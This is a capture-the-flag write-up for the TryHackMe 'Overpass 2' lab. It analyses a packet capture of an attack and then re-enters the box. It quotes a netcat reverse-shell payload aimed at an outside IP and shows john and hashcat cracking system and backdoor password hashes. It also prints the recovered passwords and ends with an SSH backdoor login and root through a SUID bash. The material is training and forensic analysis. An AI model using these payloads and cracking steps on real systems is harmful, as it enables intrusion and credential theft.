---
title: "TryHackMe - Overpass 2 - Hacked"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - enumeration
  - cron
---
Overpass has been hacked! Can you analyse the attacker's actions and hack back in?

## Forensics - Analyse the PCAP 
- What was the URL of the page they used to upload a reverse shell? 

    <a href="/assets/images/tryhackme/overpass2/1.png"><img src="/assets/images/tryhackme/overpass2/1.png"></a>

    It's `development`.

- What payload did the attacker use to gain access?

    <a href="/assets/images/tryhackme/overpass2/2.png"><img src="/assets/images/tryhackme/overpass2/2.png"></a>

    It's `exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`.

- What password did the attacker use to privesc?

    <a href="/assets/images/tryhackme/overpass2/3.png"><img src="/assets/images/tryhackme/overpass2/3.png"></a>

    It's `whenevernoteartinstant`.

- How did the attacker establish persistence?

    <a href="/assets/images/tryhackme/overpass2/4.png"><img src="/assets/images/tryhackme/overpass2/4.png"></a>

    It's `https://github.com/NinjaJc01/ssh-backdoor`.

- Using the fasttrack wordlist, how many of the system passwords were crackable?

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ john --wordlist=/usr/share/wordlists/fasttrack.txt hash 
    Using default input encoding: UTF-8
    Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 6 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    secret12         (bee)
    abcd123          (szymex)
    1qaz2wsx         (muirland)
    secuirty3        (paradox)
    4g 0:00:00:00 DONE (2021-02-03 08:51) 16.00g/s 888.0p/s 4440c/s 4440C/s Spring2017..starwars
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```

## Research - Analyse the code 
- What's the default hash for the backdoor?

    ```bash
    # From https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go
    bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
    ```

- What's the hardcoded salt for the backdoor?

    ```bash
    # From https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go
    1c362db832f3f864c8c2fe05f2002a05
    ```

- What was the hash that the attacker used? - go back to the PCAP for this!

    ```bash
    6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
    ```

    <a href="/assets/images/tryhackme/overpass2/5.png"><img src="/assets/images/tryhackme/overpass2/5.png"></a>

- Crack the hash using rockyou and a cracking tool of your choice. What's the password?

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ hashcat -m 1710 -a 0 hash /usr/share/wordlists/rockyou.txt
    hashcat (v6.1.1) starting...

    OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    =============================================================================================================================
    * Device #1: pthread-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 2172/2236 MB (1024 MB allocatable), 6MCU

    Minimum password length supported by kernel: 0
    Maximum password length supported by kernel: 256
    Minimim salt length supported by kernel: 0
    Maximum salt length supported by kernel: 256

    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1

    Applicable optimizers applied:
    * Zero-Byte
    * Early-Skip
    * Not-Iterated
    * Single-Hash
    * Single-Salt
    * Raw-Hash
    * Uses-64-Bit

    ATTENTION! Pure (unoptimized) backend kernels selected.
    Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
    If you want to switch to optimized backend kernels, append -O to your commandline.
    See the above message to find out about the exact limits.

    Watchdog: Hardware monitoring interface not found on your system.
    Watchdog: Temperature abort trigger disabled.

    Host memory required for this attack: 65 MB

    Dictionary cache hit:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344386
    * Bytes.....: 139921520
    * Keyspace..: 14344386

    6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
                                                    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Name........: sha512($pass.$salt)
    Hash.Target......: 6d05358f090eea56a238af02e47d44ee5489d234810ef624028...002a05
    Time.Started.....: Wed Feb  3 09:03:35 2021 (0 secs)
    Time.Estimated...: Wed Feb  3 09:03:35 2021 (0 secs)
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  2274.9 kH/s (0.61ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
    Recovered........: 1/1 (100.00%) Digests
    Progress.........: 18432/14344386 (0.13%)
    Rejected.........: 0/18432 (0.00%)
    Restore.Point....: 12288/14344386 (0.09%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidates.#1....: hawkeye -> telefoon

    Started: Wed Feb  3 09:03:18 2021
    Stopped: Wed Feb  3 09:03:36 2021
    ```

## Attack - Get back in! 
- The attacker defaced the website. What message did they leave as a heading?

    <a href="/assets/images/tryhackme/overpass2/6.png"><img src="/assets/images/tryhackme/overpass2/6.png"></a>

- What's the user flag?

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ ssh james@10.10.207.1 -p 2222
    james@10.10.207.1's password: 
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.

    james@overpass-production:/home/james/ssh-backdoor$
    james@overpass-production:/home/james/ssh-backdoor$ cd ..
    james@overpass-production:/home/james$ ls
    ssh-backdoor  user.txt  www
    james@overpass-production:/home/james$ cat user.txt 
    thm{REDACTED}
    ```

- What's the root flag?

    ```bash
    james@overpass-production:/home/james$ ./.suid_bash -p
    .suid_bash-4.4# whoami
    root
    .suid_bash-4.4# cat /root/root.txt
    thm{REDACTED}
    ```